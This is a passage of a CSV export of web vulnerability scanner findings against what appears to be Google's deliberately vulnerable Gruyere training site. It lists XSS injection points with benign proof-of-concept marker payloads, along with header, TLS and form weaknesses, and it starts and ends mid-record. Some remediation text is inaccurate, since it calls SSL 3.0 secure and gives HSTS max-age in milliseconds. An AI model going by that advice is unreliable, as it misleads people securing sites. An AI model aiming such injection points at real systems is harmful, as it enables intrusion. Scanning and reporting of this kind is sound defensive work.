Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"bdc20f1e-b3d2-4591-b3e2-947a4b3db86a",2022-03-15T21:06:17.432Z,2022-03-15T13:48:46Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"bf0d3243-055a-4bb2-8c61-b13e88b8ad9f",2022-03-15T21:06:17.432Z,2022-03-15T17:14:21Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom html tag.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"bf287e18-0085-4586-b764-130db4b0d94b",2022-03-15T18:42:41.743Z,2022-03-15T16:59:56Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/editprofile.gtl'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.0,"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N",5.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","The HTTP protocol by itself is clear text, meaning that any data that is transmitted via HTTP can be captured and the contents viewed.

To keep data private, and prevent it from being intercepted, HTTP is often tunnelled through either Secure Sockets Layer (SSL), or Transport Layer Security (TLS). When either of these encryption standards are used it is referred to as HTTPS.

Cyber-criminals will often attempt to compromise credentials passed from the client to the server using HTTP. This can be conducted via various different Man-in-The-Middle (MiTM) attacks or through network packet captures.

Scanner discovered that the affected page contains a `password` input, however, the value of the field is not sent to the server utilising HTTPS. Therefore it is possible that any submitted credential may become compromised.","Authentication & Session",98082,"Unencrypted Password Form",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[319, 523], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","http://www.owasp.org/index.php/Top_10_2010-A9-Insufficient_Transport_Layer_Protection",Medium,"The affected site should be secured utilising the latest and most secure encryption protocols. These include SSL version 3.0 and TLS version 1.2. While TLS 1.2 is the latest and the most preferred protocol, not all browsers will support this encryption method. Therefore, the more common SSL is included. Older protocols such as SSL version 2, and weak ciphers (< 128 bit) should also be disabled.",,"bf2c1551-0a00-49a8-b6c2-868885a86175",2022-03-15T21:06:17.432Z,2022-03-15T19:01:45Z,"The scanner detected the presence of a form containing a password field which is transmitted to the target application without using an encrypted channel (HTTPS).",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","Content Security Policy (CSP) is a web security standard that helps to mitigate attacks like cross-site scripting (XSS), clickjacking or mixed content issues. CSP provides mechanisms to websites to restrict content that browsers will be allowed to load.

No CSP header has been detected on this host. This URL is flagged as a specific example.","HTTP Security Header",112551,"Missing Content Security Policy",,2019-02-14T00:00:00Z,2022-07-18T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A4], cwe=[1021], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP, https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy, https://developers.google.com/web/fundamentals/security/csp/, https://content-security-policy.com/, https://csp-evaluator.withgoogle.com/",Low,"Configure Content Security Policy on your website by adding 'Content-Security-Policy' HTTP header or meta tag http-equiv='Content-Security-Policy'.",,"c0a34294-b961-47da-937a-15c8c8d34ffe",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"http://google-gruyere.appspot.com/361357029172560933265350706939995878846/ has no Content Security Policy defined.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"c1082df2-6d50-4a18-84bc-9df79b5a2a38",2022-03-15T21:06:17.432Z,2022-03-15T18:52:12Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/563265819128830739647592760263700851280/newsnippet.gtl with input fields : 
- snippet (no type specified)

This form is submitted by using the following action : http://google-gruyere.appspot.com/563265819128830739647592760263700851280/newsnippet2",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"c1c05515-d8d0-4244-9885-65d9bab178fb",2022-03-15T18:42:41.743Z,2022-03-15T17:38:48Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/361357029172560933265350706939995878846/saveprofile"">
  <input type=""hidden"" name=""action"" value=""update"">
  </input>
  <input type=""text"" value="""" name=""name"" maxlength=""16"">
  </input>
  <input type=""password"" name=""oldpw"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""text"" value="""" name=""icon"">
  </input>
  <input type=""text"" size=""50"" value="""" name=""web_site"">
  </input>
  <input type=""text"" value="""" name=""color"">
  </input>
  <textarea name=""private_snippet"" rows=""10"" style=""width:100%"">
  </textarea>
  <input type=""submit"" value=""Update"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",6.1,"CVSS2#AV:N/AC:H/Au:N/C:C/I:P/A:N",6.5,"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N","The remote server offers deprecated TLS 1.1 protocol.",SSL/TLS,112546,"TLS 1.1 Weak Protocol",,2018-02-13T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[327], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","https://security.googleblog.com/2018/10/modernizing-transport-security.html, https://webkit.org/blog/8462/deprecation-of-legacy-tls-1-0-and-1-1-versions/, https://blog.mozilla.org/security/2018/10/15/removing-old-versions-of-tls/, https://blogs.windows.com/msedgedev/2018/10/15/modernizing-tls-edge-ie11/",Medium,"Reconfigure the affected application, if possible to avoid the use of deprecated TLS 1.1 protocol versions and enable TLS 1.2 or later.",,"c32deb71-473a-40a8-bfb2-82a585fc9274",2022-03-15T18:42:41.743Z,2022-03-15T16:46:08Z,"
    Protocol   Supported
    ---------------------
    TLS 1.1    Yes",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scan detected that the web application makes requests that appear to be using Fetch or XMLHTTPRequests (XHRs) to communicate with a backend API server. Fetchs/XHRs allow retrieval of data from an API without triggering a page reload, making them especially useful for Single Page Applications.",General,98772,"Fetch/XHR Detected",,2019-11-14T00:00:00Z,2021-03-23T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest",Info,,,"c3c0d375-494c-4cfc-adf9-3a8bba750fb3",2022-03-15T18:42:41.743Z,2022-03-15T18:42:40Z,"The scan detected 5 unique XMLHttpRequests. Here is the distribution of MIME types used by the detected requests:




- 5 with no specified or detected MIME type

",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"c6aaa884-32d6-4fef-b7be-addb249b77f0",2022-03-15T21:06:17.432Z,2022-03-15T13:45:21Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newaccount.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"c7a2ef19-3bdc-4a65-ab21-cdeddef01b84",2022-03-15T18:42:41.743Z,2022-03-15T16:59:20Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?action=new&uid=105&pw=nessus_was_textm1fwk1hv&is_author=True' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"ca6d61fb-e11b-43ad-a1c8-ce8d0af0b051",2022-03-15T21:06:17.432Z,2022-03-15T15:42:52Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.5,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N","The HTTP protocol by itself is clear text, meaning that any data that is transmitted via HTTP can be captured and the contents viewed. To keep data private and prevent it from being intercepted, HTTP is often tunnelled through either Secure Sockets Layer (SSL) or Transport Layer Security (TLS). When either of these encryption standards are used, it is referred to as HTTPS.

HTTP Strict Transport Security (HSTS) is an optional response header that can be configured on the server to instruct the browser to only communicate via HTTPS. This will be enforced by the browser even if the user requests a HTTP resource on the same server.

Cyber-criminals will often attempt to compromise sensitive information passed from the client to the server using HTTP. This can be conducted via various Man-in-The-Middle (MiTM) attacks or through network packet captures.

Scanner discovered that the affected application is using HTTPS however does not use the HSTS header.","HTTP Security Header",98056,"Missing HTTP Strict Transport Security Policy",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[319, 523], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","https://tools.ietf.org/html/rfc6797, https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet, https://www.chromium.org/hsts, https://hstspreload.org/",Medium,"Depending on the framework being used the implementation methods will vary, however it is advised that the `Strict-Transport-Security` header be configured on the server.
One of the options for this header is `max-age`, which is a representation (in milliseconds) determining the time in which the client's browser will adhere to the header policy.
Depending on the environment and the application this time period could be from as low as minutes to as long as days.",,"ccb84cf0-633c-490c-8ad1-bf3a98cb58ca",2022-03-15T18:42:41.743Z,2022-03-15T18:03:22Z,"The scanner did not find any Strict-Transport-Security header in the response returned by the target when querying URL https://google-gruyere.appspot.com/start.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into an HTML event attribute. For example `<div onmouseover=""x=INJECTION_HERE""</div>`, where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98108,"Cross-Site Scripting (XSS) in event tag of HTML element",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"cd08e97e-ff5c-4a98-a64b-115331f1b437",2022-03-15T21:06:17.432Z,2022-03-15T14:59:18Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 |  ;tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | _refreshsnippets(""563265819128830739647592760263700851280"", ""cheddar ;tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//"")

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"d0914997-8bf1-4155-8609-bab4b95e5556",2022-03-15T21:06:17.432Z,2022-03-15T15:34:38Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/563265819128830739647592760263700851280/saveprofile"">
  <input type=""hidden"" name=""action"" value=""new"">
  </input>
  <input type=""text"" name=""uid"" value="""" maxlength=""16"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""hidden"" name=""is_author"" value=""True"">
  </input>
  <input type=""submit"" value=""Create account"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"d0f8d0b1-0014-4b63-9b29-2169713b0f1c",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"A response has been received with a response code '400' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

